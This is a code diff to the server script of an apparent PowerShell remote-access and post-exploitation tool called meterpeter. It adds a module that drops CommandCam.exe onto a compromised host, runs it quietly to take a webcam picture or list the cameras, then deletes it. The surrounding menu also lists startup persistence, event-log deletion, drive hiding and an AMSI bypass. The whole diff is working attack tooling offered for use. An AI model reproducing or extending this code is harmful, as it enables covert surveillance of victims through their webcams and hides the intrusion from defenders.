@@ -771,6 +771,7 @@ While($Client.Connected)
       ## Post-Exploiation Modules (red-team)
       write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
       write-host "   -------   -----------                     ------";
+      write-host "   CamSnap   WebCam Screenshot               Take a screenshot using webcam";
       write-host "   Persist   Remote Persist Client           Execute Client on every startup";
       write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
       write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
@@ -791,7 +792,67 @@ While($Client.Connected)
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
-      $choise = Read-Host;   
+      $choise = Read-Host;
+      If($choise -eq "CamSnap" -or $choise -eq "snap")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
+        write-host "   Snap      Take WebCam Screenshot          Client:User  - Privileges required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Snap> " -NoNewline -ForeGroundColor Green;
+        $Cam_choise = Read-Host;
+        If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Camflop = "True";
+            $Upload = $True;
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+            $Cam_set = "True";
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Return" -or $Cam_choise -eq "return" -or $Cam_choise -eq "cls" -or $Cam_choise -eq "Modules" -or $Cam_choise -eq "modules" -or $Cam_choise -eq "clear")
+        {
+          $choise = $Null;
+          $Command = $Null;
+          $Cam_choise = $Null;
+        }
+      }
       If($choise -eq "Persist" -or $choise -eq "persist")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
@@ -860,10 +921,10 @@ While($Client.Connected)
           }
         If($startup_choise -eq "Return" -or $startup_choise -eq "return" -or $logs_choise -eq "cls" -or $logs_choise -eq "Modules" -or $logs_choise -eq "modules" -or $logs_choise -eq "clear")
         {
-            $choise = $Null;
-            $Command = $Null;
-            $startup_choise = $Null;
-          }
+          $choise = $Null;
+          $Command = $Null;
+          $startup_choise = $Null;
+        }
       }
       If($choise -eq "Restart" -or $choise -eq "restart")
       {
@@ -1443,13 +1504,28 @@ While($Client.Connected)
       {
         If($OutPut -ne " ")
         {
-          $OutPut = $OutPut -replace "`n","";
-          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-          Write-Host "   ------   ---------";
-          Write-Host "   saved    $OutPut";
+          If($Cam_set -eq "True")
+          {
+            $OutPut = $OutPut -replace "`n","";$final = $OutPut -Replace "WebCamCommandCam.exe"," ";
+            write-host "`n`n  WebCam(s) Detected" -ForeGroundColor Green;
+            write-host "  ------------------";
+            Write-Host "  $final";
+            $Cam_set = "False";
+          }else{
+            $OutPut = $OutPut -replace "`n","";
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   saved    $OutPut";
+          }
           If($Flipflop -eq "True")
           {
-          write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            $Flipflop = "False";
+          }
+          If($Camflop  -eq "True")
+          {
+            write-host "   image    $env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            $Camflop = "False";
           }
           $Command = $Null;
         } Else {
